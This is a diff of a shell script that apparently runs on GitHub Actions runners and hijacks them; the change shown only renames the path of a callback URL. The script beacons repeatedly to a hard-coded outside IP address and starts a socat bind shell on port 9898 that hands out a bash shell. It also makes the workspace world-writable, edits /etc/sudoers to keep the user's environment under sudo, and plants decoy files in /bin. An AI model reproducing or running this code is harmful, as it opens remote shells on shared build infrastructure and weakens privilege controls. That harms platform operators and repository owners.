@@ -36,7 +36,7 @@ sudo touch /bin/edge;
 sudo touch /bin/bing;
 cp /tmp/busybox.bin /tmp/busybox &
 
-curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1"
+curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact22?c=1"
 
 
 if [ ! -z ${$GITHUB_WORKSPACE} ]; then 
@@ -45,7 +45,7 @@ sudo chmod 0777 -R $GITHUB_WORKSPACE/ ;
 [ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9898,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
 fi
 
-curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=2"
+curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact22?c=2"
 
 
 sudo bash -c ' mkdir /tmp/{A,aB};
@@ -54,7 +54,7 @@ sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g" /etc/sudoers;
 grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9_sudo.txt
 '
 
-curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=3"
+curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact22?c=3"
 
 
 
